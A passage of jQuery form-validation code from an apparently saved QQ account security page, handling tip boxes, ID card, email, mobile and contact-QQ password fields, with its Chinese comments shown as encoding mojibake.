			btipbox2_focus = true; btipbox3_focus = true;
			
			//�����ֲ�������ʾ
			var d = new Date();
			var t = d.getTime();
			loc_start_sec = t / 1000;
			loc_curr_obj_id = "txtAddress";
			loc_curr_tipbox_id = "tipbox_4";
			StartLocalTimer();
		});
		
		$("#txtAddress").keydown(function() {
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtAddress").blur(function() { 
			$("#txtAddress").removeClass("input_text_on");
			
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtIDCard").focus(function() { 
			$("#infoCard").hide(); $("#txtIDCard").addClass("input_text_on"); 
			btipbox2_focus = true; btipbox3_focus = true;
			
			//�����ֲ�������ʾ
			var d = new Date();
			var t = d.getTime();
			loc_start_sec = t / 1000;
			loc_curr_obj_id = "txtIDCard";
			loc_curr_tipbox_id = "tipbox_5";
			StartLocalTimer();
		});
		
		$("#txtIDCard").keydown(function() {
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtIDCard").blur(function() {
			var txtID = $("#txtIDCard").val();
			if (checkPersonalCard(txtID) == 2) $("#infoCard").show();
			else $("#infoCard").hide();
			$("#txtIDCard").removeClass("input_text_on");
			
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtContactMobile").focus(function() { 
			$("#infoMobile").hide(); 
			$("#txtContactMobile").css({color:""});
			$("#txtContactMobile").addClass("input_text_on");
			btipbox2_focus = true;
			btipbox3_focus = true;
		});
		
		$("#txtContactMobile").blur(function() {
			var txtMobile = $("#txtContactMobile").val();
			if(txtMobile != TxtContactMobileWords) {
				var CkRt = checkMobile_2(txtMobile);
				if (CkRt == 0 || CkRt == 3)
				{
					var CM=/(^(182|183)(\d{8})$)/; 
				}
				else
				{
					if (CkRt == 1) $("#infoMobile").text("����д�ֻ�����");
					else $("#infoMobile").text("�ֻ������ʽ�������飡");
					$("#infoMobile").show();
				}
			}
			else
			{
				$("#infoMobile").hide();
				$("#txtContactMobile").css({color:"#ccc"});
			}
			$("#txtContactMobile").removeClass("input_text_on");
		});
		
		$("#txtContactEmail").keydown(function() {
			//if(tipbox3_state == 1)	
			{			
				$("#tipbox_3").slideUp("normal");
				//tipbox3_state = 0;
			}
		});
		
		$("#txtContactEmail").focus(function() { 
			$("#infoEmail").hide(); 
			$("#txtContactEmail").css({color:""});
			$("#txtContactEmail").addClass("input_text_on");
			btipbox2_focus = true;
			btipbox3_focus = true;
			
			//�����ֲ�������ʾ
			var d = new Date();
			var t = d.getTime();
			loc_start_sec = t / 1000;
			loc_curr_obj_id = "txtContactEmail";
			loc_curr_tipbox_id = "tipbox_7";
			StartLocalTimer();
		});
		
		$("#txtContactEmail").keydown(function() {
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtContactEmail").blur(function() {			
			var ctrl = $.trim($("#txtContactEmail").val());
			if (ctrl == "" || ctrl == TxtContactEamilWords) {
				$("#txtContactEmail").css({color:"#ccc"});
				$("#infoEmail").text("����д�����ʼ���ַ��");
				$("#infoEmail").show();
			}
			else {
				var result = checkMail(ctrl);
				if (result == 3 || result == 2) {
					if(first_email_err)
					{
						$("#infoEmail").text("�����ʼ���ַ��ʽ����");
						$("#infoEmail").show();
						first_email_err = false;
					}
					else
					{
						topDiv="check_email_err";	
						CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"check_email_err"});
					}
					return false;
				}
				else if (result == 4) {
					$("#infoEmail").text("������ͬһ�������QQ���䣡");
					$("#infoEmail").show();
					return false;
				}
			}
			$("#txtContactEmail").removeClass("input_text_on");			
			
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtContactQQ").focus(function() { 
			$("#infoContactQQ").hide(); $("#txtContactQQ").addClass("input_text_on");
			btipbox2_focus = true;
			btipbox3_focus = true;
			
			//�����ֲ�������ʾ
			var d = new Date();
			var t = d.getTime();
			loc_start_sec = t / 1000;
			loc_curr_obj_id = "txtContactQQ";
			loc_curr_tipbox_id = "tipbox_6";
			StartLocalTimer();
			
		});
		
		$("#txtContactQQ").keydown(function() {
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
		});
		
		$("#txtContactQQ").blur(function() {
			if($("#txtContactQQ").val()==$("#txtLoginUin").val()) { //��Ҫ�����ߺ���һ�� 
					$("#infoContactQQ").text("��ϵQQ���ܺ����ߺ�����ͬ��");
					$("#infoContactQQ").show();
				}
				$("#txtContactQQ").removeClass("input_text_on");
			
			//�رվֲ�������ʾ
			if(loc_timer != 0)
			{
				StopCount(loc_timer);
				loc_timer = 0;
			}
			$("#"+loc_curr_tipbox_id).slideUp("normal");
			loc_curr_tipbox_id = "";
			loc_curr_obj_id = "";
			
		});
		fillValue();
	});
 
	document.onkeydown=function(event) {
		event = event?event:(window.event?window.event:null); 
		if (event.keyCode==13 && sub_flag==1) 
		{
			if("base" == topDiv)
			{
				$("#next").click();
			}
			else
			{
				CAqCommFrame.close();
				topDiv="base";
			}
		}
		
	}
	function CheckForm() {
		var ctrl, result;
		ctrl = $.trim($("#txtName").val());
		if (ctrl == "") {
			$("#infoName").show();
			return false;
		}
		ctrl=$.trim($("#txtIDCard").val());
		if (checkPersonalCard(ctrl) == 2) {	
			$("#infoCard").show();
			return false;
		}
		if (checkQqPwd(1) != 0)	return false;
		if (document.getElementById("radioEmail").checked) {//�ʼ���ʽ
			var ctrl = $.trim($("#txtContactEmail").val());
			if (ctrl == "" || ctrl == TxtContactEamilWords) {
				$("#txtContactEmail").css({color:"#ccc"});
				$("#infoEmail").text("����д�����ʼ���ַ��");
				$("#infoEmail").show();
				return false;
			}
			else {
				var result = checkMail(ctrl);
				if (result == 3 || result == 2) {
					if(first_email_err)
					{
						$("#infoEmail").text("�����ʼ���ַ��ʽ����");
						$("#infoEmail").show();
						first_email_err = false;
					}
					else
					{
						topDiv="check_email_err";	
						CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"check_email_err"});
					}
					return false;
				}
				else if (result == 4) {
					$("#infoEmail").text("������ͬһ�������QQ���䣡");
					$("#infoEmail").show();
					return false;
				}
				return true;
			}
		}
		else {//�ֻ���ʽ
			var ctrlPhone=$.trim($("#txtContactMobile").val());
			if ( ctrlPhone == "" || ctrlPhone == TxtContactMobileWords) {
				$("#txtContactMobile").css({color:"#ccc"});
				$("#infoMobile").text("����д��ȷ���ֻ�����");
				$("#infoMobile").show();
				return false;
			}			
			var cv= checkMobile_2(ctrlPhone);
			if (cv == 0 || cv == 3)
			{
				var CM=/(^(182|183)(\d{8})$)/; 
			}
			else	
			{
				if (cv== 1) 
				{
					$("#infoMobile").text("����д�ֻ�����");
				}
				else 
				{	
					$("#infoMobile").text("�ֻ������ʽ�������飡");
				}
				$("#infoMobile").show();
				return false;
			}
		}
		return true;
	}
	function checkPwd() {
		if ((document.getElementById("checkbox").checked == true && document.getElementById("txtContactQQPW2").value == "") || (document.getElementById("checkbox").checked == false && document.getElementById("txtContactQQPW").value == "")) {
			$("#divCaps").hide();
			$("#infoPassWdOne").show();
			return 1;
		}
		else 
			return 0;
	}
	function checkQQNumInput(uin)
	{
		var tel_num = /^(180|189|153|133)[0-9]{8}$/;
		var nornam_qq_num = /^[1-9]{1}\d{4,9}$/;
		if(""==uin)
		{
			return 3;
		}
		else if(!nornam_qq_num.test(uin) && !tel_num.test(uin))
		{
			return 2;
		}
		return 0;
	}
	function checkQqPwd(isCheckAll) {
		$("#divCaps").hide();
		result = checkQQNumInput(document.getElementById("txtContactQQ").value);
		if(result==0) {
			if($("#txtContactQQ").val()==$("#txtLoginUin").val()){ //��Ҫ�����ߺ���һ�� 
				$("#infoContactQQ").text("��ϵQQ���ܺ����ߺ�����ͬ��");
				$("#infoContactQQ").show();
				return 1;
			}
			if (isCheckAll == 1 && checkPwd() != 0) return 3;
		}
		else if (result == 2) {
			$("#infoContactQQ").text("����д��ȷ����ϵQQ");
			$("#infoContactQQ").show();
			return 2;
		}
		return 0;
	}
	function onRadioChange(curID) {
		for(var i=1; i<=2; ++i) {
			var ctrl=document.getElementById("senfe_"+i);
			ctrl.style.display="none";
		}
		document.getElementById(curID).style.display="";
		/*if(curID == "senfe_2")
		{
			usePhone = true;
		}*/
		//alert(usePhone);
		if (firstin && curID == "senfe_2" && usePhone) {
			topDiv="mobile_confirm";
			if(usePhone)
			{
				firstin = false;
			}
			CAqCommFrame.show({title:'��ܰ��ʾ',type:'div', id:"mobile_confirm"});
		}
		
		usePhone = true;
	}
	function detectCapsLock(e, tipID) {
		$("#infoPassWdOne").hide();
		var oTip = document.getElementById(tipID);
		valueCapsLock = e.keyCode ? e.keyCode:e.which;
		valueShift    = e.shiftKey? e.shiftKey:((valueCapsLock == 16) ? true : false);
		if (((valueCapsLock >= 65 && valueCapsLock <= 90)  && !valueShift) || ((valueCapsLock >= 97 && valueCapsLock <= 122) && valueShift))
		{
			oTip.style.display = "";
		}
		else oTip.style.display = "none";
	}	
	function dispEm() {
		var ctrl=document.getElementById("txtContactQQ");
		if(ctrl.value == "") {
			$("#infoPassWdOne").hide();
		}
	}
	function setTextValue(ctrlNameDest, ctrlNameSource) {
		var dest=document.getElementById(ctrlNameDest);
		var source=document.getElementById(ctrlNameSource);
		if (dest == null || source == null || source.value == "") return false;
		dest.value=source.value;
		$("#"+ctrlNameDest).css("color", "#000000");
		return true;
	}
	function fillValue() {
		setTextValue("txtName","txtHName");
		setTextValue("txtAddress","txtHAddress");
		setTextValue("txtIDCard","txtHIDCard");
		var ContactEMail=null;
		var ContactMobile=null;
		ContactEMail=document.getElementById("txtHContactEmail");
		if(ContactEMail!=null&&ContactEMail.value!="") {
			onRadioChange('senfe_1');
			document.getElementById("radioEmail").checked = true;
			setTextValue("txtContactEmail","txtHContactEmail");
		}
		ContactMobile=document.getElementById("txtHContactMobile");
		if(ContactMobile!=null&&ContactMobile.value!="") {		
			firstin = false;
			onRadioChange('senfe_2');		
			document.getElementById("radioPhone").checked = true;
			setTextValue("txtContactMobile","txtHContactMobile");
		}
	}	
	function InitBox(varBox, varWords) {
		varBox.ready(function() {
			varBox.val(varWords);
			varBox.css("color", "#999999");
		}).change(function() {
			varBox.removeAttr("style");
		}).focus(function() {
			if (varBox.val() == varWords) {
				varBox.val("");
				varBox.removeAttr("style");
			}
		}).blur(function() {
			if (varBox.val() == "") {
				varBox.val(varWords);
				varBox.css("color", "#999999");
			}
		});
	}
 
	function ChangePwdInputType(CtPlus) {
		$("#txtCtCheckBox").val(CtPlus);
		var ckb = document.getElementById("checkbox");
		if (ckb.checked == true) {
			$("#divCaps").hide();
			$("#txtContactQQPW2").val($("#txtContactQQPW").val());
			$("#txtContactQQPW").hide();
			$("#txtContactQQPW2").show();
		}
		else {
			$("#txtContactQQPW").val($("#txtContactQQPW2").val());
			$("#txtContactQQPW2").hide();
			$("#txtContactQQPW").show();
		}
	}
	loadcombox(document.getElementById('txtContactEmail'), -1, -1, 1);
</script>

 
<script src="safe_files/ping.js"></script><script src="safe_files/aqrjs_common.js"></script></body></html>